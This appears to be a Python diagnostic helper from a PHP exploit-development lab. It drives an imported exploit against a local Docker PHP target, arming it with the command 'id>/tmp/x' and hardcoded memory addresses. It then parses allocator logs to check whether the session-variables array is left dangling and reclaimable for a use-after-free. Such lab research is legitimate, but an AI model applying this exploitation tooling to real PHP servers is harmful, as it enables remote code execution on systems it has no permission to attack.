#!/usr/bin/env python3
"""diag_dangle.py — is the final PS(http_session_vars) array FREED (dangling) after stage-3 arming?"""
import argparse, subprocess, sys, time
sys.path.insert(0, "/Users/bill/php2shell/lab")
sys.path.insert(0, "/Users/bill/php2shell/alvaro")
import exploit as alv          # noqa: E402
import exploit_stock           # noqa: F401,E402

CHUNK = 0x7ffffe000000
ap = argparse.ArgumentParser()
ap.add_argument("--url", default="http://localhost:18110/index.php")
ap.add_argument("--container", default="p2s")
a = ap.parse_args()
t = alv.Target(a.url, timeout=150)
ex = alv.Exploit(t, "id>/tmp/x", 0x5996e0, 0x7b47a0, htdata=0x7e0d8, huge_mb=140)

subprocess.run(["docker", "exec", a.container, "sh", "-c", ": > /tmp/alloc_all.log"])
time.sleep(0.3)
ex.rotate(); ex._oom_arm_pads()
time.sleep(0.8)
lines = subprocess.run(["docker", "exec", a.container, "cat", "/tmp/alloc_all.log"], capture_output=True).stdout.decode("latin1").splitlines()

# last http_session_vars ref from PS lines
final_ref = None
for l in lines:
    if l.startswith("PS http_session_vars") and "ref=0x" in l:
        final_ref = int(l.split("ref=")[1].strip(), 16)
print(f"[{a.container}] final PS(http_session_vars) ref = {hex(final_ref) if final_ref else None} (off={hex(final_ref-CHUNK) if final_ref else '?'})")

# was that address allocated in-request, and freed after?
alloc_seq = {}; free_seqs = []
seq = 0
for l in lines:
    p = l.split()
    try:
        if p[0] == "M" and len(p) >= 3:
            alloc_seq[int(p[2], 16)] = seq; seq += 1
        elif p[0] == "R" and len(p) >= 4:
            alloc_seq[int(p[3], 16)] = seq; seq += 1
        elif p[0] == "F" and len(p) >= 2:
            free_seqs.append((seq, int(p[1], 16))); seq += 1
    except ValueError:
        pass

if final_ref in alloc_seq:
    aseq = alloc_seq[final_ref]
    freed_after = [s for s, addr in free_seqs if addr == final_ref and s > aseq]
    print(f"   allocated at seq={aseq}; FREED after alloc: {len(freed_after)} time(s) -> {'DANGLING (reclaimable)' if freed_after else 'STILL ALLOCATED (not reclaimable)'}")
else:
    # maybe it was the target of an erealloc; check frees regardless
    freed = [s for s, addr in free_seqs if addr == final_ref]
    print(f"   not seen as a fresh alloc; frees on that addr: {len(freed)} -> {'DANGLING' if freed else 'unknown/still-allocated'}")
